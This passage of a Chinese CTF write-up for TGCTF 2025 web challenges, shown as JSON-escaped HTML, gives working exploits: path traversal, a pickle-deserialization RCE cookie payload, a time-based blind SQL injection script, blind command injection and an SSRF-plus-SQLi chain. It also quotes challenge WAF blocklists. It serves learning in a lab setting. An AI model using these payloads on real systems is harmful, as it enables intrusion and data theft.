class=\"o\"\u003e(\u003c/span\u003eisset\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e basename\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e])\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$file_ext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e pathinfo\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e, PATHINFO_EXTENSION\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!in_array\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file_ext\u003c/span\u003e, \u003cspan class=\"nv\"\u003e$deny_ext\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$temp_file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;tmp_name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$file_content\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e file_get_contents\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$temp_file\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003epreg_match\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/.+?\u0026lt;/s\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003e$file_content\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;文件内容包含非法字符，禁止上传！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 403\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e403\u003c/span\u003e 表示禁止访问\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$img_path\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e UPLOAD_PATH . \u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emove_uploaded_file\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$temp_file\u003c/span\u003e, \u003cspan class=\"nv\"\u003e$img_path\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$is_upload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;文件上传成功！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;上传出错！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 500\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e500\u003c/span\u003e 表示服务器内部错误\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e32\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e33\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e34\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e35\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;禁止保存为该类型文件！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e36\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 403\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e403\u003c/span\u003e 表示禁止访问\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e37\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e38\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e39\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e UPLOAD_PATH . \u003cspan class=\"s1\"\u003e\u0026#39;文件夹不存在,请手工创建！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e40\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 404\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e404\u003c/span\u003e 表示资源未找到\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e41\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e42\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e43\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e44\u003c/span\u003e\u003cspan class=\"cl\"\u003e// 设置 HTTP 状态码\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e45\u003c/span\u003e\u003cspan class=\"cl\"\u003ehttp_response_code\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e46\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e47\u003c/span\u003e\u003cspan class=\"cl\"\u003e// 输出结果\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e48\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e json_encode\u003cspan class=\"o\"\u003e([\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e49\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;status_code\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e50\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;msg\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e51\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e])\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e审计一下代码，看到有个name，可以对文件名进行修改，想到目录穿越\u003c/p\u003e","title":"TGCTF-2025-Web-Writeup"},{"content":"Web Signin 题目\n1# -*- encoding: utf-8 -*- 2\u0026#39;\u0026#39;\u0026#39; 3@File : main.py 4@Time : 2025/03/28 22:20:49 5@Author : LamentXU 6\u0026#39;\u0026#39;\u0026#39; 7\u0026#39;\u0026#39;\u0026#39; 8flag in /flag_{uuid4} 9\u0026#39;\u0026#39;\u0026#39; 10from bottle import Bottle, request, response, redirect, static_file, run, route 11with open(\u0026#39;../../secret.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: 12 secret = f.read() 13 14app = Bottle() 15@route(\u0026#39;/\u0026#39;) 16def index(): 17 return \u0026#39;\u0026#39;\u0026#39;HI\u0026#39;\u0026#39;\u0026#39; 18@route(\u0026#39;/download\u0026#39;) 19def download(): 20 name = request.query.filename 21 if \u0026#39;../../\u0026#39; in name or name.startswith(\u0026#39;/\u0026#39;) or name.startswith(\u0026#39;../\u0026#39;) or \u0026#39;\\\\\u0026#39; in name: 22 response.status = 403 23 return \u0026#39;Forbidden\u0026#39; 24 with open(name, \u0026#39;rb\u0026#39;) as f: 25 data = f.read() 26 return data 27 28@route(\u0026#39;/secret\u0026#39;) 29def secret_page(): 30 try: 31 session = request.get_cookie(\u0026#34;name\u0026#34;, secret=secret) 32 if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: 33 session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} 34 response.set_cookie(\u0026#34;name\u0026#34;, session, secret=secret) 35 return \u0026#39;Forbidden!\u0026#39; 36 if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: 37 return \u0026#39;The secret has been deleted!\u0026#39; 38 except: 39 return \u0026#34;Error!\u0026#34; 40run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080, debug=False) 目录穿越拿secret\n1./.././../secret.txt 1Hell0_H@cker_Y0u_A3r_Sm@r7 看到get_cookie打pickle反序列化(get_cookie中会进行pickle反序列化)\n1from bottle import cookie_encode 2import os 3 4secret = \u0026#34;Hell0_H@cker_Y0u_A3r_Sm@r7\u0026#34; 5 6class Name: 7 def __reduce__(self): 8 return (eval, (\u0026#34;\u0026#34;\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;calc\u0026#39;).read()\u0026#34;\u0026#34;\u0026#34;,)) 9 10exp = cookie_encode((\u0026#39;session\u0026#39;,{\u0026#34;name\u0026#34;: [Name()]}),secret) 11print(exp) ‍\nezsql(手动滑稽) 这题大概fuzz一下可以发现username处waf很多\n1, 2- 3= 4| 5* 6\u0026amp; 7空格 8order by 9like 10handler 11and 12union 在password处会对单双引号进行转义\n那我们只需要想办法构造闭合然后打时间盲注，由于会对单引号进行转义，我这里用的无列名注入\n1import requests 2 3url = \u0026#34;xxxxx\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 head = 32 10 tail = 127 11 while head \u0026lt; tail: 12 mid = (head + tail) \u0026gt;\u0026gt; 1 13 # 查表名 14 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 15 # 无列名注入 16 # payload = \u0026#34;select b from (select 1 as b,2 union select * from user limit 1,1)xrntkk\u0026#34; 17 payload = \u0026#34;select b from (select 1 as b union select * from double_check limit 1,1)xrntkk\u0026#34; 18 19 20 data = { 21 \u0026#39;username\u0026#39;: \u0026#34;1\u0026#39;or\\t1=\u0026#34;, 22 \u0026#39;password\u0026#39;: f\u0026#39;or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#39; 23 } 24 try: 25 r = requests.post(url, data=data, timeout=1) 26 print(r.text) 27 tail = mid 28 except requests.exceptions.Timeout: 29 head = mid + 1 30 except Exception as e: 31 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 32 break 33 34 if head != 32: 35 result += chr(head) 36 else: 37 break 38 print(\u0026#34;[*]Result : \u0026#34;+result) 可以拿到key\n1[*]Result : dtfrtkcc0czkoua9S 在doublecheck.php中输入拿到的key后，会跳转到index.php，可以进行命令执行但是无回显\n1cat%09/flag.txt\u0026gt;/var/www/html/flag ‍\nFate 源码\n1#!/usr/bin/env python3 2import flask 3import sqlite3 4import requests 5import string 6import json 7app = flask.Flask(__name__) 8blacklist = string.ascii_letters 9def binary_to_string(binary_string): 10 if len(binary_string) % 8 != 0: 11 raise ValueError(\u0026#34;Binary string length must be a multiple of 8\u0026#34;) 12 binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)] 13 string_output = \u0026#39;\u0026#39;.join(chr(int(chunk, 2)) for chunk in binary_chunks) 14 15 return string_output 16 17@app.route(\u0026#39;/proxy\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 18def nolettersproxy(): 19 url = flask.request.args.get(\u0026#39;url\u0026#39;) 20 if not url: 21 return flask.abort(400, \u0026#39;No URL provided\u0026#39;) 22 23 target_url = \u0026#34;http://lamentxu.top\u0026#34; + url 24 for i in blacklist: 25 if i in url: 26 return flask.abort(403, \u0026#39;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~\u0026#39;) 27 if \u0026#34;.\u0026#34; in url: 28 return flask.abort(403, \u0026#39;No ssrf allowed\u0026#39;) 29 response = requests.get(target_url) 30 31 return flask.Response(response.content, response.status_code) 32def db_search(code): 33 with sqlite3.connect(\u0026#39;database.db\u0026#39;) as conn: 34 cur = conn.cursor() 35 cur.execute(f\u0026#34;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(\u0026#39;{code}\u0026#39;)))))))\u0026#34;) 36 found = cur.fetchone() 37 return None if found is None else found[0] 38 39@app.route(\u0026#39;/\u0026#39;) 40def index(): 41 print(flask.request.remote_addr) 42 return flask.render_template(\u0026#34;index.html\u0026#34;) 43 44@app.route(\u0026#39;/1337\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 45def api_search(): 46 if flask.request.remote_addr == \u0026#39;127.0.0.1\u0026#39;: 47 code = flask.request.args.get(\u0026#39;0\u0026#39;) 48 if code == \u0026#39;abcdefghi\u0026#39;: 49 print(\u0026#39;0 win!\u0026#39;) 50 req = flask.request.args.get(\u0026#39;1\u0026#39;) 51 try: 52 req = binary_to_string(req) 53 print(req) 54 req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) 55 except: 56 flask.abort(400, \u0026#34;Invalid JSON\u0026#34;) 57 if \u0026#39;name\u0026#39; not in req: 58 flask.abort(400, \u0026#34;Empty Person\u0026#39;s name\u0026#34;) 59 60 name = req[\u0026#39;name\u0026#39;] 61 if len(name) \u0026gt; 6: 62 flask.abort(400, \u0026#34;Too long\u0026#34;) 63 if \u0026#39;\\\u0026#39;\u0026#39; in name: 64 flask.abort(400, \u0026#34;NO \u0026#39;\u0026#34;) 65 if \u0026#39;)\u0026#39; in name: 66 flask.abort(400, \u0026#34;NO )\u0026#34;) 67 \u0026#34;\u0026#34;\u0026#34; 68 Some waf hidden here ;) 69 \u0026#34;\u0026#34;\u0026#34; 70 71 fate = db_search(name) 72 if fate is None: 73 flask.abort(404, \u0026#34;No such Person\u0026#34;) 74 75 return {\u0026#39;Fate\u0026#39;: fate} 76 else: 77 flask.abort(400, \u0026#34;Hello local, and hello hacker\u0026#34;) 78 else: 79 flask.abort(403, \u0026#34;Only local access allowed\u0026#34;) 80 81if __name__ == \u0026#39;__main__\u0026#39;: 82 app.run(debug=True) 审计一下源码，看到init_db里面的fake flag，思路大概就是要在/proxy路由ssrf访问/1337路由去sql读flag\n先看proxy，会将传入的url拼接到http://lamentxu.top后面\n这里可用@来绕过\n接着有两个判断，url中不能存在字母和.\n这里用长整型绕过即可\n/proxy?url=@2130706433:8080/1337 接着我们看/1337\n1code = flask.request.args.get(\u0026#39;0\u0026#39;) 2if code == \u0026#39;abcdefghi\u0026#39;: 3 print(\u0026#39;0 win!\u0026#39;) 第一个判断要求传入一串字母，直接传显然过不了/proxy处的判断\n我们这里可以二次编码绕过\n接着往下看\n1req = flask.request.args.get(\u0026#39;1\u0026#39;) 2 try: 3 req = binary_to_string(req) 4 print(req) 5 req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) 6 except: 7 flask.abort(400, \u0026#34;Invalid JSON\u0026#34;) 8 if \u0026#39;name\u0026#39; not in req: 9 flask.abort(400, \u0026#34;Empty Person\u0026#39;s name\u0026#34;) 10 11 name = req[\u0026#39;name\u0026#39;] 12 if len(name) \u0026gt; 6: 13 flask.abort(400, \u0026#34;Too long\u0026#34;) 14 if \u0026#39;\\\u0026#39;\u0026#39; in name: 15 flask.abort(400, \u0026#34;NO \u0026#39;\u0026#34;) 16 if \u0026#39;)\u0026#39; in name: 17 flask.abort(400, \u0026#34;NO )\u0026#34;) 18 \u0026#34;\u0026#34;\u0026#34; 19 Some waf hidden here ;) 20 \u0026#34;\u0026#34;\u0026#34; 21 22 fate = db_search(name) 23 if fate is None: 24 flask.abort(404, \u0026#34;No such Person\u0026#34;) 25 26 return {\u0026#39;Fate\u0026#39;: fate} 这里会将传入的内容通过binary_to_string从二进制转换成字符串，接着会解析为json。接着有一连串waf。\n这里我们通过字典绕过，然后构造闭合读flag即可\nexp\n1import requests 2 3#字符串转二进制 4def string_to_binary(input_string): 5 binary_chunks = [bin(ord(char))[2:].zfill(8) for char in input_string] 6 return \u0026#39;\u0026#39;.join(binary_chunks) 7 8url = \u0026#34;xxxxxxx\u0026#34;+\u0026#34;/proxy?url=%40%32%31%33%30%37%30%36%34%33%33%3a%38%30%38%30%2f%31%33%33%37%3f%30%3d%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%26%31%3d\u0026#34; 9payload = string_to_binary(\u0026#34;\u0026#34;\u0026#34;{\u0026#34;name\u0026#34;: {\u0026#34;\u0026#39;))))))) union select FATE from FATETABLE where NAME=\u0026#39;LAMENTXU\u0026#39;--\u0026#34;:666}}\u0026#34;\u0026#34;\u0026#34;) 10# print(payload) 11req = requests.get(url+payload) 12data = req.json() 13print(data[\u0026#39;Fate\u0026#39;]) ‍\n‍\nNow you see me 1 从源代码中找出关键代码\n1# YOU FOUND ME :) 2# -*- encoding: utf-8 -*- 3\u0026#39;\u0026#39;\u0026#39; 4@File : src.py 5@Time : 2025/03/29 01:10:37 6@Author : LamentXU 7\u0026#39;\u0026#39;\u0026#39; 8import flask 9import sys 10 11enable_hook = False 12counter = 0 13 14def audit_checker(event, args): 15 global counter 16 if enable_hook: 17 if event in [\u0026#34;exec\u0026#34;, \u0026#34;compile\u0026#34;]: 18 counter += 1 19 if counter \u0026gt; 4: 20 raise RuntimeError(event) 21 22lock_within = [ 23 \u0026#34;debug\u0026#34;, \u0026#34;form\u0026#34;, \u0026#34;args\u0026#34;, \u0026#34;values\u0026#34;, 24 \u0026#34;headers\u0026#34;, \u0026#34;json\u0026#34;, \u0026#34;stream\u0026#34;, \u0026#34;environ\u0026#34;, 25 \u0026#34;files\u0026#34;, \u0026#34;method\u0026#34;, \u0026#34;cookies\u0026#34;, \u0026#34;application\u0026#34;, 26 \u0026#39;data\u0026#39;, \u0026#39;url\u0026#39; ,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, 27 \u0026#34;getattr\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;{{\u0026#34;, \u0026#34;}}\u0026#34;, 28 \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;/\u0026#34;,\u0026#34;self\u0026#34;, 29 \u0026#34;lipsum\u0026#34;, \u0026#34;cycler\u0026#34;, \u0026#34;joiner\u0026#34;, \u0026#34;namespace\u0026#34;, 30 \u0026#34;init\u0026#34;, \u0026#34;dir\u0026#34;, \u0026#34;join\u0026#34;, \u0026#34;decode\u0026#34;, 31 \u0026#34;batch\u0026#34;, \u0026#34;first\u0026#34;, \u0026#34;last\u0026#34; , 32 \u0026#34; \u0026#34;,\u0026#34;dict\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;g.\u0026#34;, 33 \u0026#34;os\u0026#34;, \u0026#34;subprocess\u0026#34;, 34 \u0026#34;g|a\u0026#34;, \u0026#34;GLOBALS\u0026#34;, \u0026#34;lower\u0026#34;, \u0026#34;upper\u0026#34;, 35 \u0026#34;BUILTINS\u0026#34;, \u0026#34;select\u0026#34;, \u0026#34;WHOAMI\u0026#34;, \u0026#34;path\u0026#34;, 36 \u0026#34;os\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;nl\u0026#34;, \u0026#34;app\u0026#34;, \u0026#34;setattr\u0026#34;, \u0026#34;translate\u0026#34;, 37 \u0026#34;sort\u0026#34;, \u0026#34;base64\u0026#34;, \u0026#34;encode\u0026#34;, \u0026#34;\\\\u\u0026#34;, \u0026#34;pop\u0026#34;, \u0026#34;referer\u0026#34;, 38 \u0026#34;The closer you see, the lesser you find.\u0026#34;] 39 40app = flask.Flask(__name__) 41 42@app.route(\u0026#39;/\u0026#39;) 43def index(): 44 return \u0026#39;try /H3dden_route\u0026#39; 45 46@app.route(\u0026#39;/H3dden_route\u0026#39;) 47def r3al_ins1de_th0ught(): 48 global enable_hook, counter 49 name = 